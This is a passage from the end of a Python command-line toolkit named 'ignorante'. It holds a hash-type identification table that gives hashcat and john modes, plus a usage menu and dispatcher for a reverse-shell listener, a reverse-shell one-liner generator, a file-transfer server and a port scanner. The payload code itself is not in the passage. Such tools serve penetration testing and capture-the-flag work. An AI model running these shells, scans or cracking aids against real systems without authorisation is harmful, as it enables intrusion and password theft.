        [("CRC-32", None, None), ("CRC-32B", None, None), ("Adler-32", None, None),
         ("FCS-32", None, None), ("XOR-32", None, None)]),
    (r"^[a-fA-F0-9]{16}$",
        [("MySQL323 (pre-4.1)", 200, "mysql"), ("DES (Unix/Oracle)", None, None),
         ("Half MD5", 5100, None), ("CRC-64", None, None)]),
    (r"^[a-fA-F0-9]{32}$",
        [("MD5", 0, "raw-md5"), ("NTLM", 1000, "nt"), ("LM", 3000, "lm"),
         ("MD4", 900, "raw-md4"), ("double MD5 / md5(md5)", 2600, None),
         ("RIPEMD-128", None, "ripemd-128"), ("MD2", None, None),
         ("Tiger-128", None, None), ("HAVAL-128", None, None), ("Snefru-128", None, None)]),
    (r"^[a-fA-F0-9]{40}$",
        [("SHA-1", 100, "raw-sha1"), ("RIPEMD-160", 6000, "ripemd-160"),
         ("double SHA-1", 4500, None), ("Tiger-160", None, None),
         ("HAVAL-160", None, None), ("SHA-1(HMAC)", None, None)]),
    (r"^[a-fA-F0-9]{48}$",
        [("Tiger-192", None, "tiger"), ("HAVAL-192", None, None),
         ("SHA-1 (Oracle 11g)", 112, None)]),
    (r"^[a-fA-F0-9]{56}$",
        [("SHA-224", 1300, "raw-sha224"), ("SHA3-224", 17300, None),
         ("Keccak-224", 17700, None), ("HAVAL-224", None, None)]),
    (r"^[a-fA-F0-9]{64}$",
        [("SHA-256", 1400, "raw-sha256"), ("SHA3-256", 17400, None),
         ("Keccak-256", 17800, None), ("RIPEMD-256", None, None),
         ("BLAKE2s-256", None, None), ("GOST R 34.11-94", 6900, "gost"),
         ("Streebog-256", 11700, None), ("HAVAL-256", None, None), ("Snefru-256", None, None)]),
    (r"^[a-fA-F0-9]{80}$",
        [("RIPEMD-320", None, None)]),
    (r"^[a-fA-F0-9]{96}$",
        [("SHA-384", 10800, "raw-sha384"), ("SHA3-384", 17500, None),
         ("Keccak-384", 17900, None)]),
    (r"^[a-fA-F0-9]{128}$",
        [("SHA-512", 1700, "raw-sha512"), ("SHA3-512", 17600, None),
         ("Keccak-512", 18000, None), ("Whirlpool", 6100, "whirlpool"),
         ("BLAKE2b-512", 600, "raw-blake2"), ("Streebog-512", 11800, None),
         ("GOST R 34.11-2012 (512)", None, None)]),

    # --- short / base64 (ambiguous, listed last) ---
    (r"^[A-Za-z0-9./]{16}$",
        [("Cisco-PIX MD5", 2400, "pix-md5"), ("Cisco-ASA MD5", 2410, "asa-md5")]),
    (r"^[A-Za-z0-9+/]{22}==$",
        [("MD5 (base64)", None, None)]),
    (r"^[A-Za-z0-9+/]{27}=$",
        [("SHA-1 (base64)", None, "raw-sha1")]),
    (r"^[A-Za-z0-9+/]{43}=$",
        [("SHA-256 (base64)", None, None)]),
]

_HASH_DB = [(re.compile(p), cands) for p, cands in _HASH_DB_RAW]


def identify_hash(h: str):
    """return de-duplicated (name, hashcat_mode, john_format) candidates."""
    results = []
    seen = set()
    for rx, cands in _HASH_DB:
        if rx.match(h):
            for name, mode, john in cands:
                if name not in seen:
                    seen.add(name)
                    results.append((name, mode, john))
    return results


def _identify_one(h: str, multi: bool):
    if multi or not QUIET:
        shown = h if len(h) <= 54 else h[:54] + "..."
        # case preserved: a hash must not be lower-cased like other ui text.
        eprint(f"\n{DIM}--- hashid ---{RST} {shown}")
    matches = identify_hash(h)
    if not matches:
        warn("no match / unknown format.")
        return
    if not QUIET:
        eprint(f"{W}{'type':<34}{'hashcat':<11}john{RST}")
    for name, mode, john in matches:
        hc = f"-m {mode}" if mode is not None else "-"
        jf = john or "-"
        if QUIET:
            print(f"{name}\t{mode if mode is not None else ''}\t{jf}")
        else:
            print(f"{G}{name:<34}{RST}{C}{hc:<11}{RST}{DIM}{jf}{RST}")


def hashid_command(args: list):
    """identify the type(s) of one or more hashes (args or stdin, one per line)."""
    if args:
        hashes = args
    else:
        hashes = [ln.strip() for ln in sys.stdin.read().splitlines() if ln.strip()]
    if not hashes:
        err("usage: ignorante hashid <hash> [hash...]   (or pipe hashes on stdin)")
        sys.exit(1)
    multi = len(hashes) > 1
    for h in hashes:
        _identify_one(h, multi)


# ─────────────────────────────────────────────
#  cli entry point
# ─────────────────────────────────────────────

def usage():
    eprint(f"""
{W}ignorante{RST} — utility tool :)

{Y}usage:{RST}
  ignorante rs <port>                 reverse-shell listener (+auto tty upgrade)
  ignorante gen [lhost] <lport> [t]   reverse-shell one-liner generator
  ignorante serve [port] [dir]        quick http server for file transfer
  ignorante scan <host> [-p spec]     fast tcp connect scan + service detection
  ignorante enc <scheme> [data]       encode (schemes below; reads stdin if no data)
  ignorante dec <scheme|auto> [data]  decode ('auto' tries every scheme)
  ignorante hashid <hash> [hash...]   identify hash type(s) + hashcat/john mode

{Y}gen types:{RST}
  {DIM}{', '.join(PAYLOADS)}{RST}

{Y}enc/dec schemes:{RST}
  {DIM}{', '.join(CODECS)}{RST}

{Y}scan ports:{RST}
  {DIM}default=common, -p 1-1000, -p 22,80,443, -p- (all 65535){RST}

{Y}flags:{RST}
  -q, --quiet     no banner, no colors, machine-friendly output
  -h, --help      this help
""")


def main():
    argv = sys.argv[1:]

    if any(a in ("-q", "--quiet") for a in argv):
        set_quiet()
    argv = [a for a in argv if a not in ("-q", "--quiet")]

    if not argv or argv[0] in ("-h", "--help", "help"):
        clear_term()
        print_banner()
        usage()
        sys.exit(0)

    cmd = argv[0].lower()
    rest = argv[1:]

    if cmd == "rs":
        if not rest:
            err("missing port. usage: ignorante rs <port>")
            sys.exit(1)
        try:
            port = int(rest[0])
            if not (1 <= port <= 65535):
                raise ValueError
        except ValueError:
            err("port must be 1-65535.")
            sys.exit(1)
        rs_command(port)

    elif cmd == "gen":
        gen_command(rest)

    elif cmd == "serve":
        port = 8000
        directory = "."
        nums = [a for a in rest if a.isdigit()]
        paths = [a for a in rest if not a.isdigit()]
        if nums:
            port = int(nums[0])
            if not (1 <= port <= 65535):
                err("port must be 1-65535.")
                sys.exit(1)
        if paths:
            directory = paths[0]
        serve_command(port, directory)

    elif cmd == "scan":
        scan_command(rest)

    elif cmd == "enc":
        enc_command(rest)

    elif cmd == "dec":
        dec_command(rest)

    elif cmd == "hashid":
        hashid_command(rest)

    else:
        err(f"unknown command: '{cmd}'")
        usage()
        sys.exit(1)


if __name__ == "__main__":
    main()
